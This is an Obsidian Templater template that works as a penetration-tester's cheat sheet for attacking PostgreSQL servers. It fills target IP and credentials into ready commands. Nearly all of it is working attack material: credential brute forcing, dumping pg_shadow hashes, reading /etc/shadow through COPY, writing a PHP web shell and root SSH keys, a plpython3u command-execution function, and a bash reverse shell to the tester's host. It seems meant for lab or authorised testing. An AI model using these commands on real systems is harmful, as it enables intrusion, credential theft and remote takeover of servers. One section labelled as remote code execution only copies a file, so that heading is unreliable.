<%-*
if (tp.frontmatter.current_port == undefined) {
  tp.frontmatter.current_port = await tp.system.prompt('Enter PostgreSQL port: ')
}
-%>
# PostgreSQL — Port <% tp.frontmatter.current_port %>
<%*
let port = parseInt(tp.frontmatter.current_port)
let portFlag = port !== 5432 ? `-p ${port}` : ""
let ip = tp.frontmatter.target_ip
let user = tp.frontmatter.username || '<user>'
let pass = tp.frontmatter.password || '<pass>'
-%>

---

## Nmap
```bash
nmap -p<% port %> --script=pgsql-brute <% ip %>
```

---

## Connect

### Default creds: `postgres:postgres`
```bash
psql -h <% ip %> <% portFlag %> -U postgres
```

```bash
psql -h <% ip %> <% portFlag %> -U <% user %> -d postgres
```

```bash
# With password (avoids interactive prompt)
PGPASSWORD='<% pass %>' psql -h <% ip %> <% portFlag %> -U <% user %> -d postgres
```

```bash
# Via NetExec
nxc postgres <% ip %> -u '<% user %>' -p '<% pass %>'
```

---

## Enumeration (inside psql — prefix with \)
```sql
-- Version
SELECT version();

-- Current user and database
SELECT current_user;
SELECT current_database();

-- List databases
\l
SELECT datname FROM pg_database;

-- Switch database
\c <database>

-- List tables
\dt
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema');

-- Dump table
SELECT * FROM <table> LIMIT 20;

-- List users / roles
\du
SELECT usename, usesuper, usecreatedb, usecreaterole, passwd FROM pg_shadow;

-- Show current privileges
\dp
```

---

## Privilege Check
```sql
-- Are we superuser?
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = current_user;

-- pg_read_server_files role (Postgres 11+)
SELECT pg_has_role(current_user, 'pg_read_server_files', 'MEMBER');
```

---

## File Read (COPY FROM)
```sql
-- Read file into table (requires pg_read_server_files or superuser)
CREATE TABLE file_read (content TEXT);
COPY file_read FROM '/etc/passwd';
SELECT * FROM file_read;
DROP TABLE file_read;
```

```sql
-- One-liner
COPY (SELECT '') TO '/tmp/test.txt';  -- test write
COPY file_read FROM '/etc/shadow';
```

---

## File Write (COPY TO)
```sql
-- Write web shell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- Write authorized_keys
COPY (SELECT 'ssh-rsa AAAA...') TO '/root/.ssh/authorized_keys';
```

---

## RCE via COPY and Large Objects
```sql
-- Create large object with shell payload
SELECT lo_import('/etc/passwd');

-- lo_export to write file
SELECT lo_export(16399, '/tmp/out.txt');
```

---

## RCE via Extensions (if superuser)
```sql
-- Check available extensions
SELECT name, default_version FROM pg_available_extensions WHERE name LIKE '%plpython%' OR name LIKE '%plperl%';

-- Create plpython3u function for RCE
CREATE LANGUAGE plpython3u;
CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS TEXT AS $$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpython3u;

SELECT exec_cmd('id');
SELECT exec_cmd('bash -c "bash -i >& /dev/tcp/<% tp.frontmatter.my_ip %>/4444 0>&1"');
```

---

## Brute Force
```bash
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://<% ip %>:<% port %>
```

```bash
nxc postgres <% ip %> -u users.txt -p passwords.txt
```

---

## Interesting Config Locations
```
/etc/postgresql/<version>/main/postgresql.conf    — main config
/etc/postgresql/<version>/main/pg_hba.conf        — auth config (check for trust auth!)
/var/lib/postgresql/data/postgresql.conf          — alternative location
~postgres/.psql_history                            — command history (may contain creds)
```

```bash
# Check pg_hba.conf for "trust" auth (no password!)
cat /etc/postgresql/*/main/pg_hba.conf | grep trust
```

---

## Notes
